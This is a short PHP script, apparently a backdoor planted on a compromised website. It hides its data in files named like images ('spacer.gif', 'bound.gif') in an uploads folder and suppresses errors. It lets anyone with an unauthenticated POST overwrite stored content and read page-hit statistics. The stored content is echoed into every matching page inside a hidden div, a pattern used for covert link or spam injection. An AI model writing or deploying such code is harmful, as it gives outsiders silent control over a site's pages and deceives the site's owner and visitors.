<?php
ini_set('display_errors', false);
error_reporting(0);

class Client
{
	var $path;
    var $dbCode = 'spacer.gif';
	var $dbRating = 'bound.gif';
	
	function Client()
	{
		$this->path = $_SERVER['DOCUMENT_ROOT'].'/upload_images/';
        $uri = $_SERVER['REQUEST_URI'];
		if($_SERVER['REQUEST_METHOD'] == 'POST'){$this->Action();}
		if($fhr = fopen($this->path.$this->dbRating, 'r'))
		{
			$contents = '';
			while(!feof($fhr)){$contents .= fread($fhr, 8192);}
            fclose($fhr);
			$list = unserialize(base64_decode($contents));
            $list = is_array($list) ? $list : array();
            if(!isset($list[$uri])) {$list[$uri] = 0; }
            $list[$uri]++;
            if($fhr = fopen($this->path.$this->dbRating, 'w'))
            {
                fwrite($fhr, base64_encode(serialize($list)));
                fclose($fhr);
            }
		}
		if($fhc = fopen($this->path.$this->dbCode, 'r'))
		{
			$contents = '';
			while(!feof($fhc)){$contents .= fread($fhc, 8192);}		
			fclose($fhc);
			$list = unserialize(base64_decode($contents));
			if(isset($list[$uri]) && !empty($list[$uri])) {echo '<div style="display: none;">', $list[$uri], '</div>';}
		}
	}
	function Action()
	{
		switch($_POST['actionClient'])
		{
			case 'update':
				if ($fhc = fopen($this->path.$this->dbCode, 'w'))
				{
                    fwrite($fhc, $_POST['code']);
					fclose($fhc); 
				}
				exit;
			case 'getrate':
				if($fhr = fopen($this->path.$this->dbRating, 'r'))
				{
					$contents = '';
					while(!feof($fhr)){$contents .= fread($fhr, 8192);}		
					fclose($fhr);
					echo $contents;
				}
				exit;
		}
	}
}

new Client();
?>
